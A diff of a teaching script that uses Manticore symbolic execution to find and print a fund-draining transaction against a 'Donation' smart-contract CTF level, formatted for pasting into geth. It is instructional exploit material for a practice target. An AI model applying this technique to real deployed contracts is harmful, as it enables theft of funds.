@@ -1,59 +1,72 @@
-'''
-This first level is a simple script for a simple exploit
-Please read through this file and understand how the script
-    sets up the symbolic execution framework
-You'll have to provide your own wallet address and ctf level address
-    on the command or by replacing the strings in this file
-'''
-
+# Import Manticore's EVM supporting symbolic execution
 from manticore.ethereum import ManticoreEVM
-import binascii
 import sys
 
+# Parse arguments
+#   arg1 = from_address = Your wallet address
+#   arg2 = si_level_address = Your Donation CTF level address
+#   arg3 = sol_file = Donation CTF level source code to symbolically execute
 from_address = int(sys.argv[1], 16) if len(sys.argv)>1 else "<your address here>"
 si_level_address = int(sys.argv[2], 16) if len(sys.argv)>2 else "<SI ctf level address>"
 sol_file = sys.argv[3] if len(sys.argv)>3 else "../SI_ctf_levels/Donation.sol"
-gas = 100000
-contract_balance = int(0.05 * 10**18) # 0.05 ether
 
-# read in the contract source
+# Fix the amount of gas to use (can omit if you wish to rely on ManticoreEVM estimate)
+gas = 100000
+
+# Set the amount of ETH you want to obtain from the contract (0.05 ETH)
+contract_balance = int(0.05 * 10**18)
+
+# Read in the contract source
 with open(sol_file, "r") as f:
     contract_src = f.read()
 
-# instantiate manticore's Ethereum Virtual Machine
+# Instantiate Manticore's Symbolic Ethereum Virtual Machine
 m = ManticoreEVM()
 
-# create a virtual user account on the EVM
+# Create an account for your wallet address on the EVM.
+# Give it enough to deploy vulnerable contract
+#   (technically not what is done in real-life)
 user_account = m.create_account(address=from_address, balance=contract_balance)
-# create our contract
+
+# Create the Donation CTF level contract on the EVM using wallet
+#   contract_src = Prior source code
+#   contract_name = Name of contract in source code
+#   owner = Uses your wallet to deploy (OK for this level)
+#   balance = Deploy with msg.value that the CTF level is deployed with
+#   args = Arguments to deploy contract (null in this case)
 contract_account = m.solidity_create_contract(
-    contract_src, # a string containing the source file
-    contract_name="Donation", # the contract in the source file that we want to create (a file could have multiple contracts)
-    owner=user_account, # the creator address for this first exploit, we can use our own account to create it (this may not be true for future levels)
-    balance=contract_balance, # the value to send to the contructor (this will actually be deducted from our virtual address)
-    args=(0,0) # in the downloaded contract, these arguments aren't used
-    )
+    contract_src,
+    contract_name="Donation",
+    owner=user_account,
+    balance=contract_balance,
+    args=(0,0)
+)
 
-# ethereum contracts only have one entry point and use a switch statement to determine which function was called
-# solidity compiles this switch statement to check the first 4 bytes of the input and match this to the first 4 bytes of the keccak256 hash of the function signature
-# the function signature always looks like a function stub, with parameter names and whitespace removed, like this:
-# someFunction(uint256,uint256)
-# to allow manticore to call any function, we'll setup the symbolic execution engine so that it has 4 free bytes to play with
+# Ethereum contracts called via msg.data with 4 bytes of the keccak256 hash of the
+#   function signature with whitespace removed (e.g. someFunction(uint256,uint256))
+# Make symbolic buffer to hold msg.data and ask Manticore to calculate the "winning" value
 sym_args = m.make_symbolic_buffer(4)
-# now, we constrain the execution with a transaction
-m.transaction(caller=user_account, address=contract_account.address, data=sym_args, value=0, gas=gas)
 
-# for states that are still running (haven't reverted due to our transaction constraint) let's iterate through them and see if any allow for an exploit
+# Issue a symbolic transaction to the EVM by setting msg.data to symbolic buffer
+m.transaction(
+    caller=user_account,
+    address=contract_account.address,
+    data=sym_args,
+    value=0,
+    gas=gas
+)
+
+# Symbolically execute program to find an exploit that obtains our funds back.
 for state in m.running_states:
     world = state.platform
-    # stealing back all the ether is a good way of proving that an exploit exists
-    # let's constrain our state to that
+    # Check if funds can be retrieved
     if state.can_be_true(world.get_balance(user_account.address) == contract_balance):
+      # If so, add constraint
+      #   Then concretize symbolic buffer to provide one solution
       state.constraints.add(world.get_balance(user_account.address) == contract_balance)
       conc_args = state.solve_one(sym_args)
-      # print out our transaction
-      print("eth.sendTransaction({data:\"0x"+binascii.hexlify(conc_args).decode('utf-8')+"\", from:\""+hex(from_address)+"\", to:\""+hex(si_level_address)+"\", gas:"+str(gas)+"})")
-      # this prints the exploit out in a format that you can easily paste into geth to win
-      sys.exit(0) # we only needed one winning state!
+      # Print out our transaction to send to win
+      print(f'''eth.sendTransaction({{data:"0x{conc_args.hex()}", from:"0x{from_address:040x}", to:"0x{si_level_address:040x}", gas:{gas}}})''')
+      sys.exit(0)
 
 print("No valid states found")
